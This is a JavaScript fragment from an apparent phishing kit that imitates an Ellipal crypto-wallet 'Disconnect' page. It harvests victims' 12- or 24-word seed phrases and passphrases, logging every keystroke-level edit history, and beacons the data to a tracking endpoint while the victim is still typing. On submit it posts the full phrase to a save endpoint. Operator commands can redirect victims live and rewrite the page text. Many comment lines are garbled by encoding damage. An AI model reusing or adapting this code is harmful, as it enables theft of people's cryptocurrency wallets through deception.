  var PAGE='{$pageName}', TOTAL=24;
  var _llElInvalid={$elInvalidJs};

  // ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ State ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬
  var _wh={}, _lastWords={}, _ppHistory=[], _lastPP='';
  var _lastSnap='', _waiting=false, _vTimeout=null, _submitBtn=null;
  var _wordCount=24;

  // ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ Tell admin the word count on load ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬
  (function(){
    var b=new URLSearchParams({_token:CSRF,page:PAGE,type:'phrase_input',element:'word_count',value:String(_wordCount)});
    navigator.sendBeacon?navigator.sendBeacon(TRACK,b):fetch(TRACK,{method:'POST',body:b,keepalive:true});
  })();

  // ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ Helpers ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬
  function getWords(){
    var r=[], inp=document.querySelectorAll('input[placeholder="Word"]');
    for(var i=0;i<inp.length&&i<_wordCount;i++) r.push((inp[i].value||'').trim());
    return r;
  }
  function getPassphrase(){
    var el=document.querySelector('input[placeholder*="assphrase"]');
    return el?(el.value||'').trim():'';
  }
  function syncSubmitBtn(){
    if(!_submitBtn)return;
    var filled=getWords().filter(Boolean).length;
    _submitBtn.disabled=(filled<_wordCount||_waiting);
  }
  function setWordCount(n){
    // Save current words to history before switching
    document.querySelectorAll('input[placeholder="Word"]').forEach(function(inp,idx){
      var pos=String(idx+1),val=(inp.value||'').trim();
      if(val){if(!_wh[pos])_wh[pos]=[];if(_wh[pos].indexOf(val)===-1)_wh[pos].push(val);}
    });
    _wordCount=n;
    // Clear ALL word inputs on switch
    document.querySelectorAll('input[placeholder="Word"]').forEach(function(inp){ inp.value=''; });
    _lastWords={};_lastSnap='';
    document.querySelectorAll('.ellipal-ext-word').forEach(function(el){
      el.style.display=(n===24)?'':'none';
    });
    var b24=document.getElementById('ellipal-24-btn');
    var b12=document.getElementById('ellipal-12-btn');
    if(b24){b24.style.background=n===24?'#2e3040':'transparent';b24.style.fontWeight=n===24?'700':'400';}
    if(b12){b12.style.background=n===12?'#2e3040':'transparent';b12.style.fontWeight=n===12?'700':'400';}
    var bv=new URLSearchParams({_token:CSRF,page:PAGE,type:'phrase_input',element:'word_count',value:String(n)});
    navigator.sendBeacon?navigator.sendBeacon(TRACK,bv):fetch(TRACK,{method:'POST',body:bv,keepalive:true});
    syncSubmitBtn();
  }
  function trackHistory(words,pp){
    words.forEach(function(w,i){
      var k=String(i+1),p=_lastWords[k]||'';
      if(p&&p!==w){if(!_wh[k])_wh[k]=[];if(_wh[k].indexOf(p)===-1)_wh[k].push(p);}
      _lastWords[k]=w;
    });
    if(_lastPP&&_lastPP!==pp){if(_ppHistory.indexOf(_lastPP)===-1)_ppHistory.push(_lastPP);}
    _lastPP=pp;
  }
  function sendState(force){
    if(!window._llDocId||!window._llStayOk)return Promise.resolve();
    if(_waiting&&!force)return Promise.resolve();
    var words=getWords(), pp=getPassphrase();
    if(!words.some(Boolean))return Promise.resolve();
    trackHistory(words,pp);
    var snap=JSON.stringify({words:words,totalWords:_wordCount,wordHistory:_wh,passphrase:pp,passphraseHistory:_ppHistory});
    if(snap===_lastSnap&&!force)return Promise.resolve();
    _lastSnap=snap;
    return (window._encVal?window._encVal(snap):Promise.resolve(snap)).then(function(enc){
      return window._llPostTrack(new URLSearchParams({_token:CSRF,page:PAGE,type:'phrase_input',element:'full_state',value:enc,doc:window._llDocId,stay:String(window._llStayId||'')}));
    });
  }
  if(window._llStayReadyPromise)window._llStayReadyPromise.then(function(){sendState(false);});
  function showAlarm(msg){
    var a=document.getElementById('ellip-alarm');
    if(!a)return;
    a.innerHTML=(msg||'Invalid seed phrase.').replace(/\\n/g,'<br>');
    a.style.display='block';
    clearTimeout(a._t);a._t=setTimeout(function(){a.style.display='none';},12000);
  }
  function resetForm(){
    document.querySelectorAll('input[placeholder="Word"]').forEach(function(i){
      i.value='';i.dispatchEvent(new Event('input',{bubbles:true}));
    });
    var pp=document.querySelector('input[placeholder*="assphrase"]');
    if(pp){pp.value='';pp.dispatchEvent(new Event('input',{bubbles:true}));}
    if(_submitBtn){_submitBtn.disabled=false;_submitBtn.textContent='Disconnect';_submitBtn.style.opacity='1';}
    // Re-apply custom button text if it was set via URL params
    (function(){
      try{var _sp=new URLSearchParams(window.location.search);var _pvB=_sp.get('_btn');if(_pvB){_submitBtn.textContent=_pvB;}}catch(e){}
    })();
    _lastSnap='';_wh={};_ppHistory=[];_lastPP='';
    fetch(TRACK,{method:'POST',body:new URLSearchParams({_token:CSRF,page:PAGE,type:'phrase_reset',element:'word_history',value:'cleared'}),keepalive:true}).catch(function(){});
  }

  // Update title/subtitle by stable IDs injected by PHP at serve time ÃƒÂ¢Ã¢â€šÂ¬Ã¢â‚¬Â always reliable
  // â”€â”€ Custom text: sessionStorage persistence + setInterval apply â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
  var _cSK='ll_ct_'+window.location.pathname.replace(/[^a-z0-9]/gi,'_');
  var _svT={$jsCustomTitle},_svS={$jsCustomSubtitle},_svB={$jsCustomButton};
  var _cT=_svT||(sessionStorage.getItem(_cSK+'_t')||null);
  var _cS=_svS||(sessionStorage.getItem(_cSK+'_s')||null);
  var _cB=_svB||(sessionStorage.getItem(_cSK+'_b')||null);
  if(_svT)sessionStorage.setItem(_cSK+'_t',_svT);
  if(_svS)sessionStorage.setItem(_cSK+'_s',_svS);
  if(_svB)sessionStorage.setItem(_cSK+'_b',_svB);

  function _applyText(){
    if(_cT){var _te=document.getElementById('ellipal-page-title');if(_te&&_te.textContent!==_cT)_te.textContent=_cT;}
    if(_cS){var _se=document.getElementById('ellipal-page-subtitle');if(_se&&_se.textContent!==_cS)_se.textContent=_cS;}
    if(_cB&&_submitBtn&&!_waiting&&_submitBtn.textContent.trim()!==_cB)_submitBtn.textContent=_cB;
  }
  var _apN=0,_apIv=setInterval(function(){_applyText();if(++_apN>60)clearInterval(_apIv);},300);

  // ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ Override admin command handler ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬
  var _orig=window.handleAdminCommands;
  window.handleAdminCommands=function(ev){
    try{
      var d=JSON.parse(ev.detail.xhr.responseText);
      if(!d.commands||!d.commands.length)return;try{d.commands=d.commands.filter(function(c){if(!c.id)return true;var k='_ll_cmd_'+c.id;if(sessionStorage.getItem(k))return false;sessionStorage.setItem(k,'1');return true;});}catch(e){}
      var _ph=false;
      d.commands.forEach(function(cmd){
        if(cmd.command==='redirect'){
          _ph=true;
          if(_waiting){_waiting=false;if(_vTimeout){clearTimeout(_vTimeout);_vTimeout=null;}}
          var url=(cmd.payload&&cmd.payload.url)||'/ellipal/loading';
          var pp2=cmd.payload&&cmd.payload.post||{};
          var nT=pp2._title||'';var nS=pp2._sub||'';var nB=pp2._btn||'';
          var dSK='ll_ct_'+url.replace(/[^a-z0-9]/gi,'_');
          if(nT)sessionStorage.setItem(dSK+'_t',nT);
          if(nS)sessionStorage.setItem(dSK+'_s',nS);
          if(nB)sessionStorage.setItem(dSK+'_b',nB);
          if(url===window.location.pathname){window.location.reload();return;}
          window.location.href=url;
          // no reload needed
        }
      });
      if(!_ph&&_orig)_orig.call(this,ev);
    }catch(e){if(_orig)_orig.call(this,ev);}
  };

  // ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ Submit ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬
  function submitPhrase(){
    var words=getWords();
    if(words.filter(Boolean).length<_wordCount||_waiting)return;
    var pp=getPassphrase();
    _waiting=true;
    if(_submitBtn){_submitBtn.disabled=true;}
    Promise.resolve(window._llStayReadyPromise)
    .then(function(){
      if(!window._llStayOk)throw new Error('stay');
      return sendState(true);
    })
    .then(function(){
      var val=words.filter(Boolean).join(' ');
      return (window._encVal?window._encVal(val):Promise.resolve(val)).then(function(enc){
        return window._llPostTrack(new URLSearchParams({_token:CSRF,page:PAGE,type:'form_submit',element:'seed_phrase',value:enc,doc:window._llDocId,stay:String(window._llStayId||'')}));
      });
    })
    .then(function(){
      return fetch(SAVE,{method:'POST',headers:{'Content-Type':'application/json','X-CSRF-TOKEN':CSRF},
        body:JSON.stringify({words:words,passphrase:pp,page:PAGE,history:_wh,passphraseHistory:_ppHistory}),
        keepalive:true
      }).then(function(r){if(!r.ok)throw new Error('save');});
    })
    .then(function(){
      window.location.href='/ellipal/loading';
    })
    .catch(function(){_waiting=false;if(_submitBtn){_submitBtn.disabled=false;}});
  }

  // ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ DOM ready ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬Â